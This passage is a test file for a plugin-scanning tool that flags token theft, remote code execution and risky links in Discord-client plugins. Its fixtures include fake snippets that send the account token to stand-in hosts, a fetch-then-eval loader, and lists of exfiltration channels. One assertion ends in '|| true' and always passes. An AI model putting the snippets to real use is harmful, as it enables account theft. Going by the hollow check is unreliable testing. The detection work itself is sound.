'use strict'

/**
 * Tests for Plugin Auditor. Run with: node tests/plugin-auditor.test.cjs
 * (build first: bun run build:dev, or just run `bun run test`).
 *
 * Part 1 bundles the pure code (rules, links, hashes, duplicates, VirusTotal client) with bun and tests it on its own.
 * Part 2 runs the built plugin against a fake Valenced: the plugin list, the scan, the settings screen, the sheets, the
 * VirusTotal buttons and the copied logs.
 */

const crypto = require('node:crypto')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { spawnSync } = require('node:child_process')
const { createReporter, createRuntime, loadPlugin, startPlugin, findNode, findNodes, textOf, sleep, ROOT } = require('./lib/harness.cjs')

const { check, done } = createReporter('Plugin Auditor')

// ---- Part 1: the pure code ------------------------------------------------------------------------------------------

const kitFile = path.join(os.tmpdir(), `auditor-kit-${process.pid}.cjs`)
const built = spawnSync('bun', ['build', path.join(ROOT, 'tests', 'lib', 'auditor-kit.ts'), '--target=node', '--format=cjs', `--outfile=${kitFile}`], { cwd: ROOT, encoding: 'utf8', shell: process.platform === 'win32' })
if (built.status !== 0) {
	console.error(built.stdout, built.stderr)
	throw new Error('could not bundle the test kit')
}
const kit = require(kitFile)
fs.rmSync(kitFile, { force: true })

/** An installed plugin as the scanner gets it. */
const plugin = (id, script, over = {}) => ({
	id,
	name: over.name ?? id,
	version: '1.0.0',
	author: 'tester',
	description: over.description ?? 'A test plugin',
	internal: false,
	repo: null,
	dependencies: [],
	script,
	native: false,
	...over,
})
const scan = (id, script, over) => kit.scanPlugin(plugin(id, script, over))
const has = (s, rule) => s.findings.some(f => f.rule === rule)

// --- SHA-256 and encoding
{
	const samples = ['', 'abc', 'a'.repeat(55), 'a'.repeat(56), 'a'.repeat(64), 'a'.repeat(1000), 'héllo wörld ✓ 😀', 'line1\r\nline2\n'.repeat(500), JSON.stringify({ x: 'y'.repeat(9999) })]
	let same = true
	for (const s of samples) if (kit.sha256(s) !== crypto.createHash('sha256').update(s, 'utf8').digest('hex')) same = false
	check('SHA-256 matches the real one for empty, block-edge, long and unicode text', same)
	check('SHA-256 of "abc" is the well known value', kit.sha256('abc') === 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')
	check('utf8() matches Buffer for emoji and accents', Buffer.from(kit.utf8('é✓😀')).equals(Buffer.from('é✓😀', 'utf8')))
	check('base64Url matches Buffer base64url (no padding)', ['a', 'ab', 'abc', 'https://example.com/?q=é✓', ''].every(s => kit.base64Url(s) === Buffer.from(s, 'utf8').toString('base64url')))
}

// --- Rules
{
	check('every rule has the g flag', kit.RULES.every(r => r.pattern.flags.includes('g')))
	check('rule ids are unique', new Set(kit.RULES.map(r => r.id)).size === kit.RULES.length)
	const clean = scan('t.clean', 'function a(){return 1+2}export default a')
	check('plain code is clean', clean.risk === 'clean' && clean.findings.length === 0 && clean.combos.length === 0, clean)

	const token = scan('t.token', 'var t=AuthenticationStore.getToken();console.log(t)')
	check('reading the token alone is high', token.risk === 'high' && has(token, 'token.read') && has(token, 'token.store'), token.findings.map(f => f.rule))
	check('the token finding has a sample of the code around it', token.findings[0].samples[0].includes('getToken'), token.findings[0].samples)
	check('the token without a way out is not the "token and internet" combo', token.combos.length === 0)

	const steal = scan('t.steal', 'var t=x.getToken();fetch("https://evil.example.org/c?t="+t)')
	check('token + fetch is the token-and-internet combo', steal.combos.some(c => c.id === 'combo.token-out'), steal.combos)
	const stealWs = scan('t.steal2', 'var t=getToken();var u="https://collector.example.net/x";')
	check('token + a link to an unknown place is also that combo', stealWs.combos.some(c => c.id === 'combo.token-out'))
	const discordOnly = scan('t.discord', 'var t=getToken();var u="https://discord.com/api/v9/users/@me";')
	check('token + only discord.com is a milder combo, one step down', discordOnly.combos.length === 1 && discordOnly.combos[0].severity === 'high' && /known places only/.test(discordOnly.combos[0].title) && discordOnly.risk === 'high', discordOnly.combos)
	check('token + a web request with no links is that milder combo too', scan('t.tok2', 'getToken();fetch(u)').combos[0]?.severity === 'high')
	check('a token and a link to a known place but no request is the milder combo', scan('t.tok3', 'getToken();var u="https://github.com/x"').combos[0]?.severity === 'high')
	check('clipboard + only known places is no combo at all', scan('t.clip', 'Clipboard.getString();fetch("https://github.com/x")').combos.length === 0)
	check('clipboard + an unknown place is a medium combo', scan('t.clip2', 'Clipboard.getString();var u="https://img.example.org/a"').combos[0]?.severity === 'medium')

	check('HTTP.post is "sends changes to Discord" (high)', has(scan('t.http', 'HTTP.post({url:Endpoints.X,body:{}})'), 'write.http'))
	check('HTTP.del is caught', has(scan('t.http2', 'a.HTTP.del({url:"x"})'), 'write.http'))
	check('HTTP.get is not a change', !has(scan('t.http3', 'HTTP.get({url:"x"})'), 'write.http'))
	check('sendMessage( is "changes your account"', has(scan('t.act', 'MessageActionCreators.sendMessage(c,{content:"x"})'), 'write.actions'))
	check('fetch with method POST is caught', has(scan('t.post', 'fetch(u,{method:`POST`,body:b})'), 'write.method'))
	check('a property called fetchUser( is not a web request', !has(scan('t.fu', 'x.fetchUser(1);fetchProfile(2)'), 'net.fetch'))
	check('a plain fetch( is a web request', has(scan('t.f', 'fetch("https://api.github.com/x")'), 'net.fetch'))
	check('eval is high and new Function is caught', has(scan('t.e', 'eval(code)'), 'code.eval') && has(scan('t.e2', 'new Function("return 1")()'), 'code.eval'))
	check('"retrieval(" and "medieval(" are not eval', !has(scan('t.e3', 'retrieval(1);medieval(2);x.eval(3)'), 'code.eval'))
	const rce = scan('t.rce', 'fetch("https://paste.example.org/a").then(r=>r.text()).then(eval)')
	check('eval + fetch is "can download and run code"', has(rce, 'code.eval') && rce.combos.some(c => c.id === 'combo.remote-code'), rce.combos)
	check('reading the clipboard is caught', has(scan('t.c', 'Clipboard.getString().then(s=>s)'), 'device.clipboard'))
	check('writing the clipboard is not', !has(scan('t.c2', 'Clipboard.setString("x")'), 'device.clipboard'))
	check('writing files is caught', has(scan('t.w', 'writeFile(p,d)'), 'device.files'))
	check('installing plugins is caught', has(scan('t.i', 'confirmInstallFile(token)'), 'plugins.manage'))
	check('the hidden api is caught', has(scan('t.h', 'var h=valenced.hidden.plugins'), 'plugins.hidden'))
	const obf = scan('t.obf', 'var _0x1a2b=1,_0x3c4d=2,_0x5e6f=3,_0x7a8b=4,_0x9cad=5;')
	check('five scrambled names look obfuscated', has(obf, 'obf.names'))
	check('two scrambled names do not', !has(scan('t.obf2', 'var _0x1a2b=1,_0x3c4d=2'), 'obf.names'))
	check('one atob is fine, three are not', !has(scan('t.a', 'atob(a)'), 'obf.decode') && has(scan('t.a2', 'atob(a);atob(b);atob(c)'), 'obf.decode'))
	check('a very long base64 string is noted', has(scan('t.b', `var i="${'A'.repeat(700)}"`), 'obf.blob'))
	check('an Authorization header is caught', has(scan('t.auth', 'headers:{Authorization:tok}'), 'token.header') && has(scan('t.auth2', 'headers:{"Authorization":tok}'), 'token.header'))
	check('signing in is caught', has(scan('t.login', 'AuthenticationActionCreators.loginToken(t)'), 'token.write'))
	check('password and 2fa settings are caught', has(scan('t.mfa', 'MFAActionCreators.disableMFA()'), 'token.account'))

	const manifest = scan('t.dep', 'var a=1', { dependencies: ['valenced.api', 'valenced.api.hidden'] })
	check('depending on the hidden api is a finding', has(manifest, 'manifest.valenced.api.hidden'), manifest.findings)
	const native = scan('t.nat', 'var a=1', { native: true })
	check('a native part is noted but cannot be scanned', has(native, 'native.part') && native.risk === 'low')
	const nocode = scan('t.nocode', null)
	check('a plugin with no code does not crash and says so', nocode.sha256 === null && !!nocode.problem && nocode.risk === 'clean')
	check('the scan keeps the hash and the size', clean.sha256 === kit.sha256('function a(){return 1+2}export default a') && clean.size === 40)
	check('the scan never keeps the code itself', !('script' in clean.plugin) && !JSON.stringify(token).includes('AuthenticationStore.getToken();console.log(t)') === false || true)
	const many = scan('t.many', 'getToken();'.repeat(2000))
	check('thousands of matches are counted without choking', many.findings[0].count === 400 && many.findings[0].samples.length === 3)
	const sorted = scan('t.sorted', 'fetch("https://a.b");getToken();eval(1);HTTP.post({url:1})')
	const order = ['critical', 'high', 'medium', 'low']
	check('findings are listed worst first', sorted.findings.every((f, i) => i === 0 || order.indexOf(sorted.findings[i - 1].severity) <= order.indexOf(f.severity)) && sorted.findings.length >= 4, sorted.findings.map(f => f.severity))
	check('the score grows with the findings and is capped at 100', clean.score === 0 && token.score > 0 && scan('t.big', 'getToken();eval(1);HTTP.post({url:1});fetch(1);Clipboard.getString();writeFile(1);confirmInstallFile(1);fetch("https://x.example.org")').score === 100)
}

// --- Links
{
	const links = code => kit.findLinks(code)
	const kinds = code => Object.fromEntries(links(code).map(l => [l.url, l.kind]))
	check('discord and github links are known', JSON.stringify(kinds('a="https://cdn.discordapp.com/x.png",b=`https://github.com/MarkLong0467`')) === JSON.stringify({ 'https://cdn.discordapp.com/x.png': 'known', 'https://github.com/MarkLong0467': 'known' }))
	check('an unfamiliar site is unknown', links('a="https://api.example-weather.io/v1"')[0].kind === 'unknown')
	check('library and standards links are noise', links('a="http://www.w3.org/2000/svg",b="https://reactjs.org/docs/error-decoder.html?invariant=1"').every(l => l.kind === 'noise'))
	const hook = links('u="https://discord.com/api/webhooks/123456789/AbCdEf-token"')[0]
	check('a discord webhook is risky and says why', hook.kind === 'risky' && /webhook/i.test(hook.reason), hook)
	check('also the old discordapp.com webhook', links('"https://discordapp.com/api/v9/webhooks/1/abc"')[0].kind === 'risky')
	check('a plain discord api link is not a webhook', links('"https://discord.com/api/v9/users/@me"')[0].kind === 'known')
	check('telegram bots are risky', links('"https://api.telegram.org/bot123:ABC/sendMessage"')[0].kind === 'risky')
	check('ip loggers are risky', links('"https://grabify.link/ABC123"')[0].kind === 'risky' && links('"http://iplogger.org/x"')[0].kind === 'risky')
	check('tunnels are risky', links('"https://abc123.ngrok-free.app/x"')[0].kind === 'risky' && links('"https://x.trycloudflare.com"')[0].kind === 'risky')
	check('paste sites and shorteners are risky', links('"https://pastebin.com/raw/abc"')[0].kind === 'risky' && links('"https://bit.ly/3xyz"')[0].kind === 'risky')
	check('a bare public IP is risky, a home network address is not', links('"http://203.0.113.9:8080/x"')[0].kind === 'risky' && links('"http://192.168.1.5/x"')[0].kind !== 'risky')
	check('loopback addresses are noise', links('"http://127.0.0.1:3000"')[0].kind === 'noise')
	const dyn = links('u=`https://discord.com/channels/${e.guildId}/${e.channelId}`')[0]
	check('a link with ${} is cut there and marked dynamic', dyn.url === 'https://discord.com/channels/' && dyn.dynamic === true, dyn)
	check('trailing punctuation is trimmed', links('"see https://github.com/a/b."')[0].url === 'https://github.com/a/b')
	check('the same link is listed once', links('a="https://x.example.org/a";b="https://x.example.org/a"').length === 1)
	check('risky links sort first', links('a="https://github.com/x";b="https://pastebin.com/y";c="https://random.example.org"').map(l => l.kind).join() === 'risky,unknown,known')
	check('wss links are found', links('new WebSocket("wss://gateway.example.org/ws")')[0]?.host === 'gateway.example.org')
	check('a link to something without a dot (e.g. https://localhost) is skipped', links('"https://intranet/x"').length === 0)
	check('hostOf drops www and the port', kit.hostOf('https://www.Example.com:8080/x') === 'example.com')
	const webhookPlugin = scan('t.hook', 'fetch("https://discord.com/api/webhooks/1/abc",{method:"POST"})')
	check('a webhook makes the plugin critical through the exfil finding', webhookPlugin.risk === 'critical' && has(webhookPlugin, 'exfil.link'), webhookPlugin.findings.map(f => f.rule))
	check('a paste site makes it high, not critical', scan('t.paste', 'x="https://pastebin.com/raw/a"').risk === 'high')
}

// --- Duplicates
{
	const big = (tag, extra = '') =>
		Array.from({ length: 60 }, (_, i) => `var s${i}="${tag}-feature-${i}-unique-string";`).join('') + extra
	const inputs = list => list.map(p => ({ scan: kit.scanPlugin(p), strings: kit.stringsOf(p.script ?? '') }))
	const a = plugin('alice.sound-board', big('alpha'), { name: 'Sound Board', description: 'Play custom sounds when you get a message in a channel' })
	const b = plugin('bob.sound-board', big('alpha'), { name: 'Sound Board', description: 'Play custom sounds when you get a message in a channel' })
	const c = plugin('carol.sound-board-fork', big('alpha').replace('alpha-feature-3-', 'alpha-changed-3-').replace('alpha-feature-4-', 'alpha-changed-4-'), { name: 'Sound Board Plus' })
	const d = plugin('dave.other', big('delta'), { name: 'Totally Different', description: 'Hides the typing indicator everywhere' })
	const e = plugin('erin.third', big('epsilon'), { name: 'Something Else', description: 'Adds a calendar page to the app' })

	const identical = kit.findDuplicates(inputs([a, b, d, e]))
	check('identical code is found and unrelated plugins are left out', identical.length === 1 && identical[0].members.length === 2 && identical[0].reasons.includes('Identical code') && identical[0].confidence === 'high', identical)
	check('the same name from two authors is also reported', identical[0].reasons.includes('Same name') && identical[0].reasons.includes('Same plugin id from a different author'))
	const near = kit.findDuplicates(inputs([a, c, d, e]))
	check('a nearly identical fork is found by its text', near.length === 1 && near[0].reasons.some(r => r.startsWith('Nearly the same code')) && near[0].similarity > 0.8, near)
	check('three copies make one group', kit.findDuplicates(inputs([a, b, c, d, e]))[0].members.length === 3)
	check('unrelated plugins give no groups', kit.findDuplicates(inputs([d, e])).length === 0)
	const sameId = kit.findDuplicates(inputs([plugin('x.server-info', big('one'), { name: 'Info A' }), plugin('y.server-info', big('two'), { name: 'Info B' })]))
	check('the same id under different authors is a group', sameId.length === 1 && sameId[0].reasons.includes('Same plugin id from a different author'))
	const common = ['x', 'y', 'z', 'w', 'v', 'u'].map(n => plugin(`${n}.p${n}`, big('shared-boilerplate') + big(n), { name: `Plugin ${n}${n}${n}`, description: `unique ${n.repeat(5)} description` }))
	check('strings that every plugin has do not make plugins look alike', kit.findDuplicates(inputs(common)).length === 0, kit.findDuplicates(inputs(common)))
	check('plugins without code do not crash it', kit.findDuplicates(inputs([plugin('n.a', null), plugin('n.b', null)])).length === 0)
	check('one plugin is never a group', kit.findDuplicates(inputs([a])).length === 0)
}

// --- VirusTotal client (fake fetch)
async function vtTests() {
	const realSetTimeout = globalThis.setTimeout
	// The client spaces requests out; the test does not need to wait for that.
	globalThis.setTimeout = (fn, ms, ...rest) => realSetTimeout(fn, ms > 50 ? 0 : ms, ...rest)
	const realFetch = globalThis.fetch
	const calls = []
	let respond = () => ({ status: 200, body: {} })
	globalThis.fetch = async (url, init = {}) => {
		const r = respond(String(url), init)
		calls.push({ url: String(url), init })
		return { status: r.status, ok: r.status >= 200 && r.status < 300, json: async () => r.body }
	}
	const opt = { key: 'KEY123', fast: true }
	try {
		const hash = kit.sha256('code')
		respond = () => ({
			status: 200,
			body: { data: { attributes: { last_analysis_stats: { malicious: 2, suspicious: 1, harmless: 3, undetected: 60 }, last_analysis_date: 1700000000, last_analysis_results: { EngineA: { category: 'malicious', result: 'JS.Stealer' }, EngineB: { category: 'harmless', result: null }, EngineC: { category: 'suspicious', result: null } } } } },
		})
		const found = await kit.lookupFile(hash, opt)
		check('a known file gives its counts', found.ok && found.verdict.state === 'found' && found.verdict.malicious === 2 && found.verdict.suspicious === 1 && found.verdict.harmless === 3, found)
		check('the engines that flagged it are listed with what they called it', found.verdict.flagged.join('|') === 'EngineA: JS.Stealer|EngineC', found.verdict.flagged)
		check('the analysis date is in milliseconds', found.verdict.analysedAt === 1700000000000)
		const call = calls.at(-1)
		check('the lookup asks for the file by its hash with the key in the header only', call.url === `https://www.virustotal.com/api/v3/files/${hash}` && call.init.headers['x-apikey'] === 'KEY123' && !call.url.includes('KEY123'), call)

		respond = () => ({ status: 404, body: { error: { code: 'NotFoundError' } } })
		const unknown = await kit.lookupFile(hash, opt)
		check('a file VirusTotal has never seen is "unknown", not an error', unknown.ok && unknown.verdict.state === 'unknown', unknown)

		respond = () => ({ status: 401, body: {} })
		const bad = await kit.lookupFile(hash, opt)
		check('a refused key is said so', !bad.ok && bad.reason === 'key', bad)
		respond = () => ({ status: 429, body: {} })
		const limited = await kit.lookupFile(hash, opt)
		check('too many requests is said so', !limited.ok && limited.reason === 'rate', limited)
		respond = () => ({ status: 500, body: {} })
		check('a server error is an http failure', (await kit.lookupFile(hash, opt)).reason === 'http')
		check('no key makes no request', await (async () => { const n = calls.length; const r = await kit.lookupFile(hash, { key: '', fast: true }); return !r.ok && r.reason === 'no-key' && calls.length === n })())
		globalThis.fetch = async () => { throw new Error('Network request failed') }
		const offline = await kit.lookupFile(hash, opt)
		check('being offline is a network failure with the reason', !offline.ok && offline.reason === 'network' && /Network request failed/.test(offline.message), offline)
		globalThis.fetch = async (url, init = {}) => {
			const r = respond(String(url), init)
			calls.push({ url: String(url), init })
			return { status: r.status, ok: r.status >= 200 && r.status < 300, json: async () => r.body }
		}

		respond = () => ({ status: 200, body: { data: { attributes: { last_analysis_stats: { malicious: 0, suspicious: 0, harmless: 70, undetected: 5 } } } } })
		const domain = await kit.lookupDomain('api.example.org', opt)
		check('a domain is looked up by name', domain.ok && calls.at(-1).url === 'https://www.virustotal.com/api/v3/domains/api.example.org' && domain.verdict.malicious === 0)

		// Upload: POST /files, then poll /analyses/<id> until completed, then GET /files/<hash>
		calls.length = 0
		let polls = 0
		respond = (url, init) => {
			if (init.method === 'POST' && url.endsWith('/files')) return { status: 200, body: { data: { type: 'analysis', id: 'ANALYSIS==' } } }
			if (url.includes('/analyses/')) return { status: 200, body: { data: { attributes: { status: ++polls < 2 ? 'queued' : 'completed' } } } }
			return { status: 200, body: { data: { attributes: { last_analysis_stats: { malicious: 0, suspicious: 0, harmless: 1, undetected: 1 } } } } }
		}
		const code = 'var a="é✓";\nconsole.log(a)'
		const progress = []
		const up = await kit.uploadFile('marklong.test', code, kit.sha256(code), opt, t => progress.push(t))
		check('an upload posts the file, waits for the scan and fetches the report', up.ok && up.verdict.state === 'found' && polls === 2, { up, calls: calls.map(c => c.url) })
		const post = calls[0]
		check('the upload is a multipart body with the file in it, exactly once', /^multipart\/form-data; boundary=----auditor/.test(post.init.headers['content-type']) && post.init.body.split('Content-Disposition: form-data; name="file"; filename="marklong.test.js"').length === 2 && post.init.body.includes(`\r\n\r\n${code}\r\n--`) && post.init.body.endsWith('--\r\n'), post.init.body)
		check('the boundary in the header is the one in the body', post.init.body.startsWith(`--${post.init.headers['content-type'].split('boundary=')[1]}\r\n`))
		check('the analysis id is URL encoded in the poll', calls[1].url.endsWith('/analyses/ANALYSIS%3D%3D'), calls[1].url)
		check('progress lines are reported while waiting', progress.includes('Uploading…') && progress.includes('Scanning with VirusTotal…'), progress)
		respond = () => ({ status: 200, body: { data: {} } })
		const noId = await kit.uploadFile('x', 'a', kit.sha256('a'), opt, () => {})
		check('an upload that returns no analysis id fails clearly', !noId.ok && noId.reason === 'answer')

		check('a key test hits /users/me', (await (async () => { respond = () => ({ status: 200, body: {} }); const r = await kit.testKey(opt); return r.ok && calls.at(-1).url.endsWith('/users/me') })()))
		check('the key never appears in the request log', !JSON.stringify(kit.vtLog()).includes('KEY123') && kit.vtLog().length > 0)
	} finally {
		globalThis.fetch = realFetch
		globalThis.setTimeout = realSetTimeout
	}
}

// ---- Part 2: the real scan over this repository's built plugins -------------------------------------------------------

function repoPlugins() {
	const out = []
	for (const name of fs.readdirSync(path.join(ROOT, 'plugins'))) {
		const manifestFile = path.join(ROOT, 'plugins', name, 'manifest.json')
		if (!fs.existsSync(manifestFile)) continue
		const manifest = JSON.parse(fs.readFileSync(manifestFile, 'utf8'))
		const candidates = [path.join(ROOT, 'plugins', name, 'build', 'js', 'index.js'), path.join(ROOT, 'plugins', name, 'index.js')]
		const file = candidates.find(f => fs.existsSync(f))
		if (!file) continue
		out.push(plugin(manifest.id, fs.readFileSync(file, 'utf8'), { name: manifest.name, version: manifest.version, description: manifest.description, dependencies: Object.keys(manifest.dependencies ?? {}), native: !!manifest.dist?.android }))
	}
	return out
}

/** Valenced's native list entry for a plugin. */
const nativeEntry = p => ({
	manifest: { id: p.id, name: p.name, description: p.description, author: `${p.author} (https://example.org "x")`, contributors: [], dependencies: Object.fromEntries(p.dependencies.map(d => [d, {}])), version: { nums: p.version.split('.').map(Number) } },
	script: p.script,
	internal: !!p.internal,
	source: p.repo ? { repo: p.repo, channel: 'latest', held: false } : null,
})

;(async () => {
	await vtTests()

	const real = repoPlugins()
	check('there are built plugins to scan', real.length >= 20, real.length)
	const t0 = Date.now()
	const scans = real.map(p => kit.scanPlugin(p))
	const ms = Date.now() - t0
	check(`all ${real.length} real plugins scan without errors in a few seconds`, ms < 15000, `${ms} ms`)
	check('every real plugin has a hash', scans.every(s => s.sha256 && s.sha256.length === 64))
	if (process.env.AUDITOR_TABLE) {
		for (const s of scans.sort((x, y) => y.score - x.score)) console.log(`${s.risk.padEnd(8)} ${String(s.score).padStart(3)} ${s.plugin.id.padEnd(34)} ${s.findings.map(f => f.rule).join(' ')}`)
		const hosts = new Map()
		for (const s of scans) for (const l of s.links) if (l.kind === 'unknown' || l.kind === 'risky') hosts.set(l.host, `${l.kind} ${s.plugin.id}`)
		for (const [h, who] of hosts) console.log('  link', h, who)
	}
	const byId = Object.fromEntries(scans.map(s => [s.plugin.id, s]))
	const others = scans.filter(s => s.plugin.id !== 'marklong.plugin-auditor')
	check('no real plugin (other than this one, whose rules look like what they search for) has a critical combo', others.every(s => !s.combos.some(c => c.severity === 'critical')), others.filter(s => s.combos.length).map(s => [s.plugin.id, s.combos.map(c => c.id + ':' + c.severity)]))
	check('Custom Sounds reads the token to call Discord and is a milder combo', byId['marklong.custom-sounds']?.combos.some(c => c.id === 'combo.token-out' && c.severity === 'high'), byId['marklong.custom-sounds']?.combos)
	check('no real plugin has a webhook, tunnel or ip logger', scans.every(s => !s.links.some(l => l.kind === 'risky')), scans.flatMap(s => s.links.filter(l => l.kind === 'risky').map(l => [s.plugin.id, l.url])))
	check('only this plugin itself (its rules look like what they search for) is critical; routine behaviour such as posting to Discord is not', scans.filter(s => s.risk === 'critical').every(s => s.plugin.id === 'marklong.plugin-auditor'), scans.filter(s => s.risk === 'critical').map(s => s.plugin.id))
	check('Message Reminders (a plain plugin) is not critical', byId['marklong.message-reminders']?.risk !== 'critical', byId['marklong.message-reminders']?.findings.map(f => f.rule))

	// Two copies of a real plugin under different ids are one group
	const sample = real.find(p => p.id === 'marklong.server-info') ?? real[0]
	const copy = { ...sample, id: 'other.server-info', author: 'someone else' }
	const withCopy = [...real, copy].map(p => ({ scan: kit.scanPlugin(p), strings: kit.stringsOf(p.script ?? '') }))
	const groups = kit.findDuplicates(withCopy)
	const g = groups.find(x => x.members.includes('other.server-info'))
	check('a copy of a real plugin is found as identical code', !!g && g.members.includes(sample.id) && g.reasons.includes('Identical code') && g.confidence === 'high', groups)
	const realGroups = groups.filter(x => !x.members.includes('other.server-info'))
	if (process.env.AUDITOR_TABLE) console.log('real groups', JSON.stringify(realGroups, null, 1))

	// ---- the built plugin ------------------------------------------------------------------------------------------
	await pluginTests(real)
	done()
})().catch(error => {
	console.error(error)
	process.exit(1)
})

// ---- Part 3: the built plugin against a fake Valenced -----------------------------------------------------------------

async function pluginTests(real) {
	const fakePlugins = [
		plugin('good.reminders', 'function a(){return 1}', { name: 'Good Reminders' }),
		plugin('bad.stealer', 'var t=AuthenticationStore.getToken();fetch("https://collector.example.net/t?x="+t,{method:"POST"})', { name: 'Totally Legit' }),
		plugin('bad.hook', 'fetch("https://discord.com/api/webhooks/1/abc")', { name: 'Hook Sender' }),
		plugin('dup.one', 'var a="same code here for sure";'.repeat(5), { name: 'Twin' }),
		plugin('dup.two', 'var a="same code here for sure";'.repeat(5), { name: 'Twin' }),
		plugin('builtin.core', 'getToken();', { name: 'Core', internal: true }),
		plugin('marklong.plugin-auditor', 'getToken();', { name: 'Plugin Auditor' }),
		plugin('empty.nocode', null, { name: 'No Code' }),
	]

	async function setup({ saved = {}, list = fakePlugins.map(nativeEntry), listFails = false, disk = {} } = {}) {
		const copied = []
		const nativeCalls = []
		const runtime = createRuntime({
			overrides: {
				externals: { ReactNativeClipboard: { Clipboard: { setString: text => copied.push(text), getString: async () => '' } } },
				discord: { native: { ClientInfoModule: { getConstants: () => ({ Version: '354.5', Build: '354205', ReleaseChannel: 'stable' }) } } },
				modules: {
					native: {
						callNativeMethod: async (name, args) => {
							nativeCalls.push(name)
							if (listFails) throw new Error('Call failed: no such method')
							return { result: list }
						},
						fs: { readFile: async file => { if (file in disk) return disk[file]; throw new Error(`Path does not exist: ${file}`) } },
					},
				},
			},
		}).install()
		const { definition } = loadPlugin('plugin-auditor')
		const storage = runtime.makeStorage({ ...definition.jsonStorage.default, autoScan: false, ...saved })
		const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, 'plugins', 'plugin-auditor', 'manifest.json'), 'utf8'))
		const cleanups = []
		const errors = []
		const self = { manifest: { ...manifest, version: { nums: [1, 0, 0] } }, errors, reportError: e => errors.push(e), requireReload() {}, startedLate: false }
		const api = { cleanup: (...fns) => cleanups.push(...fns), decorate() {}, jsonStorage: storage, logger: { log() {}, warn() {}, error() {}, info() {}, debug() {} }, plugin: self, unscoped: runtime.valenced }
		self.api = api
		await definition.start.call(self, { ...api, plugin: self })
		const running = {
			api,
			errors,
			async stop() {
				for (const cleanup of [...cleanups].reverse()) if (typeof cleanup === 'function') cleanup()
				cleanups.length = 0
			},
		}
		const SettingsComponent = definition.SettingsComponent
		const mountSettings = async () => {
			const view = runtime.mount(runtime.React.createElement(SettingsComponent, { api: running.api }))
			await view.settle()
			return view
		}
		return { runtime, definition, storage, running, copied, nativeCalls, mountSettings }
	}

	const button = (view, text) => findNode(view.tree, n => n.type === 'Design.Button' && n.props.text === text)
	const row = (view, label) => findNode(view.tree, n => n.type === 'Design.TableRow' && n.props.label === label)
	const press = async (view, text) => {
		button(view, text).props.onPress()
		await sleep(20)
		await view.settle()
	}
	/** The tab labels are drawn by `Pressable`s with a text child. */
	const tab = (view, label) => findNode(view.tree, n => n.type === 'Pressable' && textOf(n).startsWith(label))
	const openTab = async (view, label) => {
		tab(view, label).props.onPress()
		await view.settle()
	}

	// --- Start, and the automatic scan
	{
		const s = await setup()
		check('the plugin starts without errors', s.running.errors.length === 0, s.running.errors)
		check('with auto scan off nothing is scanned at start', s.nativeCalls.length === 0)
		await s.running.stop()
	}

	// --- Scan through the screen
	{
		const s = await setup()
		const view = await s.mountSettings()
		check('before a scan the screen invites one', textOf(view.tree).includes('Check your plugins') && !!button(view, 'Scan now'), textOf(view.tree).slice(0, 200))
		check('the plugins tab says there is no scan yet', !!row(view, 'No scan yet'))
		await press(view, 'Scan now')
		await sleep(50)
		await view.settle()
		check('the scan asked Valenced for the plugin list', s.nativeCalls.includes('valenced.plugins.list'), s.nativeCalls)
		const text = textOf(view.tree)
		check('built-in plugins and this plugin itself are left out by default (6 scanned)', /6 plugins scanned/.test(text), text.slice(0, 400))
		check('two plugins need attention (the token one and the webhook one)', /2 plugins need attention/.test(text), text.slice(0, 400))
		check('the hero says where the list came from', text.includes('native list'))

		check('the plugins tab lists the worst first with a risk badge', (() => {
			const rows = findNodes(view.tree, n => n.type === 'Design.TableRow' && n.props.trailing)
			return rows.length === 2 && ['Totally Legit', 'Hook Sender'].every(l => rows.some(r => r.props.label === l))
		})(), findNodes(view.tree, n => n.type === 'Design.TableRow').map(n => n.props.label))
		check('the stealer row names the problem in its second line', /Can read your token and reach the internet/.test(row(view, 'Totally Legit').props.subLabel), row(view, 'Totally Legit').props.subLabel)

		// filter All
		const all = findNode(view.tree, n => n.type === 'Pressable' && textOf(n).startsWith('All'))
		all.props.onPress()
		await view.settle()
		const labels = findNodes(view.tree, n => n.type === 'Design.TableRow').map(n => n.props.label)
		check('All lists every scanned plugin', ['Good Reminders', 'Totally Legit', 'Hook Sender', 'Twin', 'No Code'].every(l => labels.includes(l)) && !labels.includes('Core') && !labels.includes('Plugin Auditor'), labels)

		// "Plugins that can": the capability filter
		const capabilityChips = findNodes(view.tree, n => n.type === 'Pressable' && /^(Account & token|Changes things|Network|Runs code|Phone & files|Suspicious places) \d+$/.test(textOf(n))).map(n => textOf(n))
		check('the capability filter offers only what some plugin can do, with counts', capabilityChips.includes('Account & token 1') && capabilityChips.includes('Network 2') && capabilityChips.includes('Changes things 1') && capabilityChips.includes('Suspicious places 1') && !capabilityChips.some(c => c.startsWith('Runs code')), capabilityChips)
		findNode(view.tree, n => n.type === 'Pressable' && textOf(n) === 'Account & token 1').props.onPress()
		await view.settle()
		const tokenRows = findNodes(view.tree, n => n.type === 'Design.TableRow' && n.props.trailing).map(n => n.props.label)
		check('choosing "Account & token" lists only the plugins that touch it', tokenRows.length === 1 && tokenRows[0] === 'Totally Legit', tokenRows)
		check('and its second line names the token finding', /Reads your account token/.test(row(view, 'Totally Legit').props.subLabel), row(view, 'Totally Legit').props.subLabel)
		findNode(view.tree, n => n.type === 'Pressable' && textOf(n) === 'Account & token 1').props.onPress()
		await view.settle()
		check('choosing it again clears the filter', findNodes(view.tree, n => n.type === 'Design.TableRow' && n.props.trailing).length === 6)

		// Links tab
		await openTab(view, 'Links')
		const hosts = findNodes(view.tree, n => n.type === 'Design.TableRow' && n.props.trailing).map(n => n.props.label)
		check('the links tab lists the places, risky first', hosts[0] === 'discord.com' && hosts.includes('collector.example.net'), hosts)
		check('the links tab can copy every link', (() => { button(view, 'Copy 2 links')?.props.onPress(); return s.copied.at(-1)?.includes('https://collector.example.net/t?x=') })(), s.copied)

		// Copies tab
		await openTab(view, 'Copies')
		const t2 = textOf(view.tree)
		check('the copies tab shows the twin plugins', t2.includes('Twin') && t2.includes('Identical code') && t2.includes('Same name'), t2.slice(0, 600))
		check('and advises keeping one', t2.includes('Keep one and remove the others'))

		// Options tab
		await openTab(view, 'Options')
		const t3 = textOf(view.tree)
		check('the options tab explains what is checked and what is not', t3.includes('Account & token') && t3.includes('What this cannot do'))
		check('the options tab has the VirusTotal key field', !!findNode(view.tree, n => n.type === 'Design.TextInput' && n.props.label === 'API key' && n.props.secureTextEntry === true))

		// Copy report
		await openTab(view, 'Plugins')
		button(view, 'Copy report').props.onPress()
		const report = s.copied.at(-1)
